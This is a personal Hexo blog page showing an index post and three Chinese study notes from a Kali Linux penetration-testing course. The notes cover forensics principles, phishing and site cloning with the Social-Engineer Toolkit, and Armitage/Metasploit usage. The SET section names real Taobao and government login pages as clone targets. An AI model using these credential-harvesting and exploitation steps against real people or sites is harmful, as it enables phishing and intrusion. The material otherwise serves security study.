<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/20/README/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/20/README/" itemprop="url">写在最前</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-20T19:40:17+08:00">
                2020-02-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  86 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h1 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h1><h3 id="本-README-md-为此博客目录索引"><a href="#本-README-md-为此博客目录索引" class="headerlink" title="本 README.md 为此博客目录索引"></a>本 <strong>README.md</strong> 为此博客目录索引</h3><ul>
<li>Github：<a href="https://github.com/Tomassky" target="_blank" rel="noopener">https://github.com/Tomassky</a></li>
<li>Gmail：<a href="mailto:tomassky7@gamil.com" target="_blank" rel="noopener">tomassky7@gamil.com</a></li>
<li>QQ：<a href="mailto:643008933@qq.com" target="_blank" rel="noopener">643008933@qq.com</a></li>
</ul>
<h2 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h2><ul>
<li><a href="https://tomassky.github.io/categories/Kali/" target="_blank" rel="noopener">Kali Linux笔记</a><ul>
<li><a href="https://www.aqniukt.com/course/83" target="_blank" rel="noopener">此笔记为安全牛苑房宏的Kali渗透测试课程</a></li>
</ul>
</li>
</ul>
<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><ul>
<li><a href="https://tomassky.github.io/categories/Git/" target="_blank" rel="noopener">Git笔记</a><ul>
<li><a href="https://www.youtube.com/playlist?list=PLK2w-tGRdrj5jO9Y1k2iAPCw7iSo6YVdx" target="_blank" rel="noopener">此笔记为Youtube代码真香的Git教程</a></li>
</ul>
</li>
</ul>
<h2 id="Penetration-tools"><a href="#Penetration-tools" class="headerlink" title="Penetration tools"></a>Penetration tools</h2><ul>
<li><a href="https://tomassky.github.io/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" target="_blank" rel="noopener">渗透工具</a> </li>
</ul>
<h2 id="Operating-System"><a href="#Operating-System" class="headerlink" title="Operating System"></a>Operating System</h2><ul>
<li><a href="https://tomassky.github.io/categories/Operating-System/" target="_blank" rel="noopener">操作系统基础</a></li>
</ul>
<h2 id="IPS"><a href="#IPS" class="headerlink" title="IPS"></a>IPS</h2><ul>
<li><a href="https://tomassky.github.io/categories/IPS/" target="_blank" rel="noopener">IPS笔记</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%94)%EF%BC%9A%E5%8F%96%E8%AF%81%E7%A7%91%E5%AD%A6%E3%80%81%E5%88%86%E7%B1%BB%E3%80%81%E5%8E%9F%E5%88%99%E3%80%81%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%94)%EF%BC%9A%E5%8F%96%E8%AF%81%E7%A7%91%E5%AD%A6%E3%80%81%E5%88%86%E7%B1%BB%E3%80%81%E5%8E%9F%E5%88%99%E3%80%81%E6%96%B9%E6%B3%95%E3%80%81%E5%B7%A5%E5%85%B7/" itemprop="url">Kali Linux笔记(一百一十五)：取证科学、分类、原则、方法、工具</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T11:52:55+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  959 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-取证科学简介"><a href="#1-取证科学简介" class="headerlink" title="1. 取证科学简介"></a>1. 取证科学简介</h4><ul>
<li>Forensic investigations</li>
<li>法庭取证调查</li>
<li>事件响应调查<ul>
<li>黑客攻击、渗透测试痕迹</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=df66VAp0ztjMApaji8NM3rOZw0sBTyNRhFzgcicA2Oq4J9Wua5fFoEUx_-11NIVdARg-Lzt-xXCuJtHDvEj40JQve8iE7EPm_SJ3Z87lHKEbqAZrPDthpQ8ylZo5Lo-l6lqQvZ1HfqnFewObAmu4Rg&file_name=/CSI%EF%BC%9ACRIME%20SCENE%20INVESTIGATION.png" alt="CSI：CRIME SCENE INVESTIGATION"></p>
<h4 id="2-取证科学"><a href="#2-取证科学" class="headerlink" title="2. 取证科学"></a>2. 取证科学</h4><ul>
<li>什么是Forensic科学<ul>
<li>法医的、用于法庭的、辩论学、法医学</li>
<li>为了侦破案件还原事实真相，收集法庭证据的一系列科学方法<ul>
<li>参考本地区法律要求</li>
<li>实践操作通用原则</li>
</ul>
</li>
</ul>
</li>
<li>CSI：物理取证<ul>
<li>指纹、DNA、弹道、血迹</li>
<li>物理取证的理论基础是物质交换原则</li>
</ul>
</li>
<li>本章关注：数字取证 / 计算机取证 / 电子取证<ul>
<li>智能设备、计算机、手机平板、IoT、有线及无线通信（Wireshark抓包分析）、数据存储</li>
</ul>
</li>
</ul>
<h4 id="3-通用原则"><a href="#3-通用原则" class="headerlink" title="3. 通用原则"></a>3. 通用原则</h4><ul>
<li>维护证据完整性<ul>
<li>数字取证比物理取证幸运的多，可以有无限数量的拷贝进行分析<ul>
<li>▲ 对iphone手机芯片的复制，可以实现理论上的暴力破解</li>
</ul>
</li>
<li>数字HASH值验证数据完整性</li>
</ul>
</li>
<li>维护监管链<ul>
<li>物理证物保存在证物袋中，每次取出使用严格记录，避免破坏污染</li>
<li>数字证物原始版本写保护，使用拷贝进行分析</li>
</ul>
</li>
<li>标准的操作步骤<ul>
<li>证物使用严格按照规范流程，即使事后证明流程有误（免责）</li>
</ul>
</li>
<li>取证分析全部过程记录文档</li>
<li>数字取证者的座右铭<ul>
<li>不要破坏数据现场（看似简单，实际几乎无法实现）<ul>
<li>系统命令可能被植入木马，整个计算机都不可信 → 使用干净U盘的操作系统命令</li>
<li>使用干净U盘的操作系统命令可能也会占用内存资源，破坏现场</li>
<li>▲ 虚拟机一定程度上通过控制台可实现不破坏数据现场</li>
</ul>
</li>
<li>寄存器、CPU缓存、I/O设备缓存等易失性数据几乎无法获取</li>
<li>系统内存是主要的易失性存储介质取证对象，不修改无法获取其中数据<ul>
<li>程序、操作系统指令会对内存进行修改</li>
</ul>
</li>
<li>非易失性存储介质通常使用完整镜像拷贝保存<ul>
<li>不同于文件拷贝，从磁道层面的复制（01代码的复制，可能包含已删除的文件）</li>
</ul>
</li>
<li>正常关机还是直接拔掉电源（数据丢失破坏）<ul>
<li>拔电源：存在于内存中的数据无法保存到硬盘</li>
<li>正常关机：木马程序可能进行数据擦除破坏</li>
<li>▲ 建议拔电源，Ext4日志型文件型系统直接拔电源，不会丢失日志</li>
</ul>
</li>
</ul>
</li>
<li>证据搜索<ul>
<li>数据（数据提炼）</li>
<li>信息（信息收集）</li>
<li>证据（得出入侵的证据 → 法庭的呈堂证供/技术分析）</li>
</ul>
</li>
<li>作为安全从业者<ul>
<li>通过取证还原黑客入侵的轨迹</li>
<li>作为渗透测试和黑客攻击区分标准<ul>
<li>世纪佳缘事件</li>
<li>印象笔记渗透测试事件</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-取证方法"><a href="#4-取证方法" class="headerlink" title="4. 取证方法"></a>4. 取证方法</h4><ul>
<li>活取证（服务器未关机，可对内存和硬盘取证）<ul>
<li>抓取文件metadata、创建时间线、命令历史、分析日志文件、哈希摘要、转存内存信息</li>
<li>使用未受感染的干净程序执行取证</li>
<li>U盘 / 网络存储收集到的数据</li>
<li>▲ 新建用户取证</li>
</ul>
</li>
<li>死取证（服务器关机、可对硬盘取证）<ul>
<li>关机后制作硬盘镜像、分析镜像（MBR、GPT、LVM）<ul>
<li>硬盘格式<ul>
<li>大块MBR</li>
<li>全局分区表GPT</li>
<li>逻辑卷LVM</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-取证工具–Dumpit"><a href="#5-取证工具–Dumpit" class="headerlink" title="5. 取证工具–Dumpit"></a>5. 取证工具–Dumpit</h4><ul>
<li>不考虑法律因素、法庭证据、监管链、文档记录等取证环节</li>
<li>只介绍Kali当中部分取证工具的使用方法</li>
<li>内存dump工具<ul>
<li>Dumpit：<a href="http://www.moonsols.com/wp-content/uploads/downloads/2011/07/DumpIt.zip" target="_blank" rel="noopener">http://www.moonsols.com/wp-content/uploads/downloads/2011/07/DumpIt.zip</a></li>
<li>内存文件与内存大小接近或者稍微大一点，raw格式</li>
</ul>
</li>
<li>实验<ul>
<li>Window 7</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E5%9B%9B)%EF%BC%9A%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E5%9B%9B)%EF%BC%9A%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/" itemprop="url">Kali Linux笔记(一百一十四)：社会工程学</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T11:47:34+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  689 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-新闻插播"><a href="#1-新闻插播" class="headerlink" title="1. 新闻插播"></a>1. 新闻插播</h4><ul>
<li>Metasploit被发现两个远程代码执行漏洞<ul>
<li>问题都出在WEB组件方面</li>
<li>MSF不受影响</li>
</ul>
</li>
<li>安全面前软软平等<ul>
<li>没有没有漏洞的软件</li>
</ul>
</li>
</ul>
<h4 id="2-社会工程学"><a href="#2-社会工程学" class="headerlink" title="2. 社会工程学"></a>2. 社会工程学</h4><ul>
<li>为什么在这说社会工程学（Social Engineering）<ul>
<li>Metasploit可以很好的配合到社会工程学攻击的各个阶段</li>
<li>Setoolkit工具包大量依赖Metasploit</li>
<li>基于浏览器等客户端软件漏洞实现对客户端计算机的攻击</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=277cNRhLwgALyO7E4Ti_KZHMLZP7dhMYVlHyt_PEGODNkHD7UlOH5tuQpHMpGsyNIGnif-Y30ReZSHsE9ihnX7vp_n4jyvuaNWv8YluiyX4inNUXSdEQ3NKk5i_29NlouiT9Jd8&file_name=/THE%20ART%20OF%20DECEPTION.jpg" alt="THE ART OF DECEPTION"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=d88c7MgLXeqYfkV-a0bkuXecJfVLXdnfHW1mc7qzKUSjxQjGcVR_ttOTE_oBPTupkDr5I_8DfVC_9XdicbhqqB6CBly3QTd-GJd_vqowKoJBPDMC1oKEc7JYRJCL0ek5&file_name=/%E5%85%A5%E4%BE%B5%E7%9A%84%E8%89%BA%E6%9C%AF.png" alt="入侵的艺术"></p>
<ul>
<li>社会工程学<ul>
<li>社会：人式社会化的动物（人与人之间的关系，群体利益决定结构架构）</li>
<li>工程：依据标准的步骤完成任务达成目标的一套方法</li>
<li>通过人的交流，使用欺骗伪装等手段绕过安全机制实现入侵的非技术手段</li>
</ul>
</li>
<li>社会工程学攻击的四个阶段<ul>
<li>研究：信息收集（WEB、媒体、垃圾桶、物理），确定并研究目标人</li>
<li>钩子：与目标建立第一次交谈（Hook、下套）</li>
<li>下手：与目标建立信任并获取信息</li>
<li>退场：不引起目标怀疑的离开攻击现场</li>
</ul>
</li>
<li>类型<ul>
<li>基于人的社工<ul>
<li>搭载</li>
<li>伪造身份</li>
<li>偷听 / 窃肩</li>
<li>▲ 反社工</li>
<li>垃圾桶工程</li>
</ul>
</li>
<li>基于计算机的社工<ul>
<li>弹出窗口</li>
<li>内部网络攻击</li>
<li>钓鱼邮件</li>
<li>419尼日利亚骗局</li>
<li>短信诈骗</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-Social-Engineer-Toolkit（SET）"><a href="#3-Social-Engineer-Toolkit（SET）" class="headerlink" title="3. Social-Engineer Toolkit（SET）"></a>3. Social-Engineer Toolkit（SET）</h4><ul>
<li>Socia-Engineering Attacks<ul>
<li>Spear Phishing Attack Vectors<ul>
<li>Perform a Mass Email Attack（多个Email地址发送）</li>
<li>▲ Create a FileFormat Payload（Payload-Email发送）<ul>
<li>PAYLOADS</li>
</ul>
</li>
<li>Create a Social-Engineering Template（模板Email发送）</li>
</ul>
</li>
<li>Website Attack Vectors（Web攻击向量）<ul>
<li>Java Applet Attack Method</li>
<li>Metasploit Browser Exploit Attack Method</li>
<li>Credential Harvester Attack Method<ul>
<li>Web Templates</li>
<li>Site Cloner（克隆站点，apache_dir/harvester_data.txt）<ul>
<li>Kali的IP</li>
<li>URL地址</li>
<li>▲ 第一次网址为伪造，第二次网址为正确的网址</li>
</ul>
</li>
<li>Custom Import</li>
</ul>
</li>
<li>Tabnabbing Attack Method</li>
<li>Web Jacking Attack Method</li>
<li>Multi-Attack Web Method</li>
<li>Full Screen Attack Method</li>
<li>HTA Attack Method</li>
</ul>
</li>
<li>Infectius Media Generator（感染媒体，USB/CD/DVD → autorun.inf）</li>
<li>Create a Payload and Listener（MSF监听功能，/root/.set/payload.exe，调用MSF控制窗口进行侦听）</li>
<li>Mass Mailer Attack（大量钓鱼邮件）</li>
<li>Arduio-Based Attack Vector（Arduio嵌入开发）</li>
<li>Wireless Access Point Attack Vector（伪造无线AP）<ul>
<li>安装DHCP服务</li>
<li>手段配置</li>
</ul>
</li>
<li>QRCode Generator Attack Vector（生成一个二维码，绑定一个Payload）<ul>
<li>漏洞利用URL地址（/root/.set/reports/qcode_attack.png）</li>
</ul>
</li>
<li>Powsershell Attack Vectors（Powershell脚本）</li>
<li>SMS SPoofing Attack Vector（欺骗短信，但需要提前到指定网站注册购买短信服务）</li>
<li>Third Party Modules（第三方模块，可添加）</li>
</ul>
</li>
<li>⭐ 站点克隆 1 2 3 2<ul>
<li><a href="https://login.taobao.com/member/login.jhtml" target="_blank" rel="noopener">https://login.taobao.com/member/login.jhtml</a> </li>
<li><a href="http://admin.smeshx.gov.cn/login.php" target="_blank" rel="noopener">http://admin.smeshx.gov.cn/login.php</a></li>
</ul>
</li>
<li>⭐ 发送钓鱼软件 1 1 2</li>
<li>⭐ WEB站点攻击 1 2 1 2</li>
<li>▲ 2020.03.04 Github地址：<a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener">https://github.com/trustedsec/social-engineer-toolkit</a></li>
<li>▲ 2020.03.04 此项目依旧在维护更新，且呈现一种框架性的趋势</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%89)%EF%BC%9AArmitage/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%89)%EF%BC%9AArmitage/" itemprop="url">Kali Linux笔记(一百一十三)：Armitage</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T11:45:28+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  673 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Armitage图形化前端"><a href="#1-Armitage图形化前端" class="headerlink" title="1. Armitage图形化前端"></a>1. Armitage图形化前端</h4><ul>
<li>开源免费图形前端<ul>
<li>基于JAVA开发的界面</li>
<li>作者自称是众多不会使用metasploit的安全专家之一（命令行）</li>
<li>MSF基于命令行，缺少直观的GUI图形用户接口</li>
</ul>
</li>
<li>Armitage只是调用MSF的漏洞利用能力<ul>
<li>Armitage的每一个GUI操作都可以对应对应MSF中一条命令</li>
</ul>
</li>
<li>红队团队合作模拟对抗<ul>
<li>分为客户端（armitage）和服务器（msfrpcd）两部分</li>
<li>/usr/share/armitage/teamserver ip password</li>
<li>▲ 允许多个客户端连接一个服务器，监听55553</li>
</ul>
</li>
<li>可脚本化</li>
<li>启动方式<ul>
<li><strong><code>🔺命令：service postgresql start</code></strong></li>
<li>Teamserver<ul>
<li>服务端：<strong><code>🔺命令：./teamserver 服务器IP 连接密码</code></strong></li>
<li>客户端：<strong><code>🔺命令：armitage</code></strong></li>
</ul>
</li>
<li>单机启动<br>  -<strong><code>🔺命令：Armitage</code></strong> <ul>
<li>GUI启动</li>
<li>127.0.0.1 55553</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-实验–Armitage"><a href="#2-实验–Armitage" class="headerlink" title="2. 实验–Armitage"></a>2. 实验–Armitage</h4><ul>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li>单机使用：点击Armitage的图标（127.0.0.1 / 55553）</li>
<li>界面使用</li>
<li><strong><code>🔺命令：cd /usr/share/armitage</code></strong></li>
<li><strong><code>🔺命令：./teamserver Kali的IP pass123</code></strong></li>
<li>团队模式：点击Armitage的图标（Kali的IP  / 55553 / Tom）</li>
<li>团队模式：点击Armitage的图标（Kali的IP  / 55553 / Jan）</li>
</ul>
</li>
</ul>
<h4 id="3-Armitage图形化前端"><a href="#3-Armitage图形化前端" class="headerlink" title="3. Armitage图形化前端"></a>3. Armitage图形化前端</h4><ul>
<li>发现主机（顶栏 → Hosts）<ul>
<li>Add Hosts：手动添加IP地址</li>
<li>Import Hosts：扫描结果导入XML文件（nmap、nessus openvas、appscan、nexpose、awvs）</li>
<li>NMAP Scan/MSF Scan：直接扫描发现（nmap、msf）</li>
<li>DNS Enumerate：DNS枚举发现</li>
</ul>
</li>
<li>扫描端口及服务</li>
<li>工作区workspace<ul>
<li>个人视角的目标动态显示筛选，同一team的队员自定义工作区</li>
<li>基于地址的工作区划分</li>
<li>基于端口的工作区划分</li>
<li>基于操作系统的工作区划分</li>
<li>基于标签的工作区划分</li>
</ul>
</li>
<li>生成Payload<ul>
<li>reverse_tcp</li>
<li>bind_hidden_tcp（只有在AHOST主动连接时，才监听4444端口）</li>
<li>bind_tcp</li>
</ul>
</li>
<li>主动获取目标<ul>
<li>ms08_067</li>
</ul>
</li>
<li>被动获得目标<ul>
<li>Browser_autopwn2（伪造网站进行被动攻击）</li>
</ul>
</li>
<li>Meterpreter shell 能力展示<ul>
<li>空密码：aa63…. / 316c</li>
<li>Poviting → ARP Scan（层级结构）</li>
</ul>
</li>
<li>菜单功能<ul>
<li>SOCKS4（用Kali做跳板机，通过建立的meterpreter隧道进行内网漫游）</li>
<li>Script（可添加script脚本，比如Cortana脚本）</li>
</ul>
</li>
<li>Cortana脚本<ul>
<li>Veil-Evasionғ/use/share/veil-evasion/tools/cortana/veil_evasion.cna </li>
